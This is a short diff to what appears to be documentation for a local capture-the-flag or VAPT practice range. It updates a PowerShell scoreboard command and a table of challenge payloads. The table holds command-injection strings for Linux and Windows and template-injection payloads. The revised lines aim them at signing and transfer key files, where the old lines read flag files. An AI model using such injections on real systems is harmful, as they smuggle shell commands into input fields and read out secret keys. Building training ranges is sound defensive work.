@@ -201,7 +201,7 @@ Start-ScheduledTask -TaskName HELPAG-VAPT-Test-Site
 Get-Content .\logs\meridian-events.jsonl -Wait -Tail 20 |
     ForEach-Object { $_ | ConvertFrom-Json | Select-Object timestamp, source_ip, event_type, severity }
 
-Invoke-RestMethod http://localhost:8080/api/ctf/scoreboard |
+Invoke-RestMethod http://localhost:8080/range/api/scoreboard -Headers @{ "X-Range-Token" = $env:RANGE_CONSOLE_TOKEN } |
     Select-Object -ExpandProperty teams | Format-Table rank, team, solves, points
 ```
 
@@ -225,8 +225,8 @@ Windows range.
 
 | Challenge | Linux payload | Windows payload |
 |---|---|---|
-| `rce-cmdi` | `host=127.0.0.1; cat flagstore/cmdi.flag` | `host=127.0.0.1 & type flagstore\cmdi.flag` |
-| `rce-ssti` | `os.popen('cat flagstore/ssti.flag').read()` | `__builtins__.open('flagstore/ssti.flag').read()` |
+| `rce-cmdi` | `host=127.0.0.1; cat instance/keys/depot-transfer.key` | `host=127.0.0.1 & type instance\keys\depot-transfer.key` |
+| `rce-ssti` | `os.popen('cat instance/keys/campaign-signing.key').read()` | `__builtins__.open('instance/keys/campaign-signing.key').read()` |
 
 `cmd.exe` chains with `&`, not `;`, and its `type` command rejects forward
 slashes. The SSTI payload avoids the shell entirely and works on both platforms.
